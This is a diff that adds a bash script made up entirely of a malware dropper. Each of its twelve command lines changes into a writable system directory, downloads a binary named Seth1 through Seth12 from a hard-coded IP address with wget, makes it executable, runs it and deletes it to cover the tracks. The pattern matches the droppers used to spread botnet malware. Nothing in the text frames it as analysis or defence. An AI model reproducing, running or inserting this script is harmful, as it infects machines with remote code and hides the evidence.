@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth; chmod +x Seth; ./Seth; rm -rf Seth
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth2; chmod +x Seth2; ./Seth2; rm -rf Seth2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth3; chmod +x Seth3; ./Seth3; rm -rf Seth3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth4; chmod +x Seth4; ./Seth4; rm -rf Seth4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth5; chmod +x Seth5; ./Seth5; rm -rf Seth5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth6; chmod +x Seth6; ./Seth6; rm -rf Seth6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth7; chmod +x Seth7; ./Seth7; rm -rf Seth7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth8; chmod +x Seth8; ./Seth8; rm -rf Seth8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth9; chmod +x Seth9; ./Seth9; rm -rf Seth9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth10; chmod +x Seth10; ./Seth10; rm -rf Seth10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth11; chmod +x Seth11; ./Seth11; rm -rf Seth11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.7.57.157/Seth12; chmod +x Seth12; ./Seth12; rm -rf Seth12
